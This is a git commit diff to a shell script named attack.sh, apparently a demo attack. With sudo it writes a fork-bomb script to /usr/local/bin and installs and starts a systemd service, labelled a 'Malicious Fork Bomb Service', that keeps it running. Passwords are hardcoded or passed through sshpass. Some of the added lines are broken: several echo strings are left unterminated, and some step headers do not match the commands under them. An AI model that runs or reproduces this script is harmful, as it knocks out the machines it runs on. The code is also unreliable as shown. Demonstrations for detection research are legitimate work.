f1716683542f2bc505aeb18f60dd79265debcfaa
idankalman <166123057+idankalman@users.noreply.github.com>
2024-08-24 12:10:03 +0300

    Update attack.sh

--- demo/attack.sh
+++ demo/attack.sh
@@ -2,10 +2,27 @@ Green='\033[0;32m'
 Color_Off='\033[0m'
 
 echo -e "$Green"
-echo "Creating a malicious script of fork bomb"
-echo 1 | sudo -S touch /usr/local/bin/fork_bomb.sh
 
-echo 1 | sudo -S tee /usr/local/bin/fork_bomb.sh > /dev/null << EOF
+echo "###########################################################"
+echo "#####           Creating a fork bomb script           #####"
+echo "###########################################################"
+echo ""
+echo "   $ sudo touch /usr/local/bin/fork_bomb.sh
+sleep 5
+echo ""
+sshpass -p $PASSWORD sudo touch /usr/local/bin/fork_bomb.sh
+echo ""
+echo ""
+sleep 5
+
+echo "###########################################################"
+echo "#####      Adding content to the fork bomb scipt      #####"
+echo "###########################################################"
+echo ""
+echo "   $ sudo tee /usr/local/bin/fork_bomb.sh
+sleep 5
+echo ""
+sshpass -p $PASSWORD sudo tee /usr/local/bin/fork_bomb.sh > /dev/null << EOF
 #!/bin/bash
 
 create_child_process() {
@@ -25,21 +42,54 @@ do
     sleep 30
 done
 EOF
-
-sleep 3
-
 echo ""
-echo "Making demo as owner of the malicious script and making script executable"
-echo '1' | sudo -S chmod +x /usr/local/bin/fork_bomb.sh
-echo 1 | sudo -S chown demo: /usr/local/bin/fork_bomb.sh
-
-sleep 3 
-
 echo ""
-echo "Creating a service for the malicious fork bomb script"
-echo 1 | sudo -S touch /etc/systemd/system/fork.service
+sleep 5
 
-echo 1 | sudo -S tee /etc/systemd/system/fork.service > /dev/null << EOF
+echo "###########################################################"
+echo "#####  Granting execution permissions for the script  #####"
+echo "###########################################################"
+echo ""
+echo "   $ sudo chmod +x /usr/local/bin/fork_bomb.sh
+sleep 5
+echo ""
+sshpass -p $PASSWORD sudo chmod +x /usr/local/bin/fork_bomb.sh
+echo ""
+echo ""
+sleep 5
+
+echo "###########################################################"
+echo "#####  Granting ownership to attacker for the script  #####"
+echo "###########################################################"
+echo ""
+echo "   $ sudo chown demo: /usr/local/bin/fork_bomb.sh
+sleep 5
+echo ""
+sshpass -p $PASSWORD sudo chown demo: /usr/local/bin/fork_bomb.sh
+echo ""
+echo ""
+sleep 5
+
+echo "###########################################################"
+echo "#####     Creating a daemon for fork bomb attack      #####"
+echo "###########################################################"
+echo ""
+echo "   $ sudo touch /etc/systemd/system/fork.service
+sleep 5
+echo ""
+sshpass -p $PASSWORD sudo touch /etc/systemd/system/fork.service
+echo ""
+echo ""
+sleep 5
+
+echo "###########################################################"
+echo "#####        Adding content to the daemon file        #####"
+echo "###########################################################"
+echo ""
+echo "   $ sudo tee /etc/systemd/system/fork.service
+sleep 5
+echo ""
+sshpass -p $PASSWORD sudo tee /etc/systemd/system/fork.service > /dev/null << EOF
 [Unit]
 Description=Malicious Fork Bomb Service
 After=network.target
@@ -55,13 +105,44 @@ Type=simple
 [Install]
 WantedBy=multi-user.target
 EOF
-
-sleep 3
-
 echo ""
-echo "Reloading systemd and starting the malicious fork bomb script"
-echo 1 | sudo -S systemctl daemon-reload
-echo 1 | sudo -S systemctl start fork.service
-
 echo ""
-echo "Fork Bomb attack has begun !!! $Color_Off"
+sleep 5
+
+echo "###########################################################"
+echo "#####            Reloading Linux daemons              #####"
+echo "###########################################################"
+echo ""
+echo "   $ sudo touch /etc/systemd/system/fork.service
+sleep 5
+echo ""
+sshpass -p $PASSWORD sudo touch /etc/systemd/system/fork.service
+echo ""
+echo ""
+sleep 5
+
+echo "###########################################################"
+echo "#####     Creating a daemon for fork bomb attack      #####"
+echo "###########################################################"
+echo ""
+echo "   $ sudo systemctl daemon-reload
+sleep 5
+echo ""
+sshpass -p $PASSWORD sudo systemctl daemon-reload
+echo ""
+echo ""
+sleep 5
+
+echo "###########################################################"
+echo "#####      Starting the fork bomb daemon attack       #####"
+echo "###########################################################"
+echo ""
+echo "   $ sudo systemctl start fork.service
+sleep 5
+echo ""
+sshpass -p $PASSWORD sudo systemctl start fork.service
+echo ""
+echo ""
+sleep 5
+
+echo -e "$Color_Off"
